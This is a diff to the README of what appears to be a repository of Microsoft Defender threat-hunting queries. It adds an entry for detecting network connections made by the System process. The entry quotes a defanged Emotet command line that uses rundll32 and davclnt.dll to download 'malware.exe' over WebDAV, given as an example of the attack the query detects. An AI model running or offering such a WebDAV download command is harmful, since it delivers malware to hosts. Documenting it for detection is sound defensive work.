@@ -19,3 +19,9 @@ Click on the '🔎' hotlink to plug the query right into your Advanced Hunting Q
 - For each service installation, check the global prevalence of the service executable
 - Idea from mRr3b00t [@UK_Daniel_Card](https://twitter.com/UK_Daniel_Card) ([link to tweet](https://twitter.com/UK_Daniel_Card/status/1657005272764760065))
 - Query is slow and the join needs more scrutiny for correctness
+
+### [🔎](https://security.microsoft.com/v2/advanced-hunting?query=H4sIAAAAAAAAA6WU3WrbQBCF57rQd9iKQlJo4zr9o4ZcpHZLe1NMHdqUpgTZVmpjRRKSbCdQ8uz9ZlaKJWNDISyWd2dnzpk5M1JHOuJkJLdSSCmRXHOaSM4u5DyXRP5gSTiXspaUm4V5pNjUOjEvPRWVfSmxTNmPuXXghdzdsitlVuEV8lgewavMp1XUNUtRnJyxhvyH-BXYJkSFlpuirjkpUo1X2C7H44o1x9tV1khuJCOX1CLqSn5gH8sA3u8WmfKc8lxzr76hsWjWMbbQlNhkG1mWpanhGUIsyhJJr-GXo0ICUsx6JcdyZL6qRx-_C6siqXgLzkVDf_W_4C6UFdXE-JXEe6znZK72kWXQJz6lH3ND7hL3Ds-X1a-LbQarqtCzvNoev3j-xtaRp_yW8EfkXbDPOI1hUzU7W1r4KF-N1jvgf2WekXxtTclH7JFl7_v917o3MxbN9wt3vjObSRtylxqW9v4T1thwVWWNOZE7nkFrXoOd6KeNyTzDO6viTyy-v2N-R1Q9uecOWl2_sU4s6YKixJajqqJVDPfUl9ikHIKeocRrubS5vOSUs1tVM30o3xpTpWjPWI5Vvx8fyNZtRTmbeFUs2sO-jerkiSmmXdSObN6jgBl4K-_p67G8Ic8jLDX7QD7DrtFXRPpuTJlCZ0qoTd_20jTRDi7kRUOdh-fl5zUwPVxDldgmP2NKQ7gW_83ku99jdVuou9Z-Jn-TWp7K1pyQ4v5rWHs-RIFzqj9vdeSnfWFz48_p_4F965pvbD2T_wDuYJTv2gUAAA&timeRangeId=week) [System Process Network Connections](SystemProcessNetCons.kusto)
+
+- Looks for network connections initiated from the System process
+- A common TTP associated with this traffic is exploiting WebDAV to download malware
+- Emotet example: `rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 127.0.0.1 hxxp://127.0.0[.]1/$/users/public/malware[.]exe`
